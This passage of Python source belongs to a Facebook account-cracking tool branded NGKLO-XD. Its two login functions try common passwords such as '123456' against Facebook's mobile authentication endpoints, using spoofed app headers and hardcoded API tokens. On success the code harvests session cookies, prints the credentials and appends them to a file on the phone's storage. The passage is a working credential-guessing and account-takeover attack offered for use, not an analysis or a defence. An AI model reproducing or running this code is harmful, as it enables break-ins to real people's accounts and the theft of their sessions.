    year | 2010
    cookie | c_user=...;xs=...
    profile | https://www.facebook.com/profile.php?id=1000012345
    ________________________________________________
    """
    global loop, oks
    session = requests.session()
    success = False
    try:
        # Add back the cracking count at the start
        sys.stdout.write(
            f"\r\r\x1b[38;5;195m[\x1b[1;37mNGKLO-XD\x1b[38;5;195m]"
            f"\x1b[38;5;196m•\x1b[38;5;192m{loop}\x1b[38;5;195m|\x1b[38;5;195m|"
            f"\x1b[1;37mOK\x1b[38;5;195m|\x1b[38;5;195m|"
            f"\x1b[38;5;192m{len(oks)}"
        )
        sys.stdout.flush()

        profile_link = f"https://www.facebook.com/profile.php?id={uid}"
        year = creationyear(uid)  

        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': NGKLO(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data, headers=headers, allow_redirects=False
            ).json()

            cookies = "N/A"

            # SUCCESS CASE 1: session_key
            if 'session_key' in res:
                try:
                    cookies = ";".join(
                        [f"{c['name']}={c['value']}" for c in res.get('session_cookies', [])]
                    ) or "N/A"
                except:
                    cookies = "N/A"

                # PRINT WITH EMOJI AND COLORS
                print(f"\r\033[1;97m[NGKLO-OK]\x1b[0m")
                print(f"\033[1;97m𝐔𝐈𝐃 \033[1;97m| \033[1;32m{uid} \033[1;97m| \033[1;32m{pw}\x1b[0m")
                print(f"\033[1;97m𝐘𝐄𝐀𝐑 \033[1;97m| \033[1;32m{year}\x1b[0m")
                print(f"\033[1;95m𝐂𝐎𝐎𝐊??𝐄 \033[1;97m| \033[1;32m{cookies}\x1b[0m")
                print(f"\033[1;93m𝐏𝐑𝐎𝐅𝐈𝐋𝐄 \033[1;97m|\x1b[0m \x1b[36m{profile_link}\x1b[0m")
                print("_" * 60)

                # SPEAK
                os.system('espeak -a 300 "Cracked Ok id,"')

                # SAVE WITH EMOJI
                with open('/sdcard/NGKLO-OLD-OK.txt', 'a') as f:
                    f.write(f"uid | {uid} | {pw}\n")
                    f.write(f"year | {year}\n")
                    f.write(f"cookie | {cookies}\n")
                    f.write(f"profile | {profile_link}\n")
                    f.write("_" * 60 + "\n")

                oks.append(uid)
                success = True
                break

            # SUCCESS CASE 2: Redirect
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                cookies = "N/A"

                print(f"\r\033[1;97m[NGKLO-OK]\x1b[0m")
                print(f"\033[1;97m𝐔𝐈𝐃 \033[1;97m| \033[1;32m{uid} \033[1;97m| \033[1;32m{pw}\x1b[0m")
                print(f"\033[1;97m𝐘𝐄𝐀𝐑 \033[1;97m| \033[1;32m{year}\x1b[0m")
                print(f"\033[1;95m𝐂𝐎𝐎𝐊𝐈𝐄 \033[1;97m| \033[1;32m{cookies}\x1b[0m")
                print(f"\033[1;93m𝐏𝐑𝐎𝐅𝐈𝐋𝐄 \033[1;97m|\x1b[0m \x1b[36m{profile_link}\x1b[0m")
                print("_" * 60)

                os.system('espeak -a 300 "Cracked Ok id," && sleep 1 && espeak -v en+f3 -s 120 -a 300 "Login ID in the morning"')

                with open('/sdcard/NGKLO-OLD-OK.txt', 'a') as f:
                    f.write(f"uid | {uid} | {pw}\n")
                    f.write(f"year | {year}\n")
                    f.write(f"cookie | {cookies}\n")
                    f.write(f"profile | {profile_link}\n")
                    f.write("_" * 60 + "\n")

                oks.append(uid)
                success = True
                break

        loop += 1
    except Exception as e:
        time.sleep(5)


def login_2(uid):
    """
    Login attempt method 2.
    """
    sys.stdout.write(f"\r\r\x1b[38;5;195m[\x1b[1;37mNGKLO-XD\x1b[38;5;195m]|\x1b[38;5;195m[\x1b[38;5;192m{loop}\x1b[38;5;195m]| \x1b[38;5;195m[\x1b[1;37mOK\x1b[38;5;195m]| \x1b[38;5;195m[\x1b[38;5;192m{len(oks)}")
    
    for pw in ('123456', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': NGKLO(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[38;5;196m[\x1b[1;37mNGKLO-OK]\x1b[1;97m•\x1b[38;5;46m{uid}|\x1b[1;97m| \x1b[38;5;46m{pw}|\x1b[1;97m| \x1b[38;5;15m{creationyear(uid)}");os.system('espeak -a 300 " Cracked Ok id,"')
                    open('/sdcard/NGKLO-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\x1b[38;5;196m[\x1b[1;37mNGKLO-OK]\x1b[1;97m•\x1b[38;5;46m{uid}|\x1b[1;97m| \x1b[38;5;46m{pw}|\x1b[1;97m| \x1b[38;5;15m{creationyear(uid)}");os.system('espeak -a 300 " Cracked Ok id,"')
                    open('/sdcard/NGKLO-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception as e:
            pass
    loop += 1

if __name__ == '__main__':
    BNG_71_()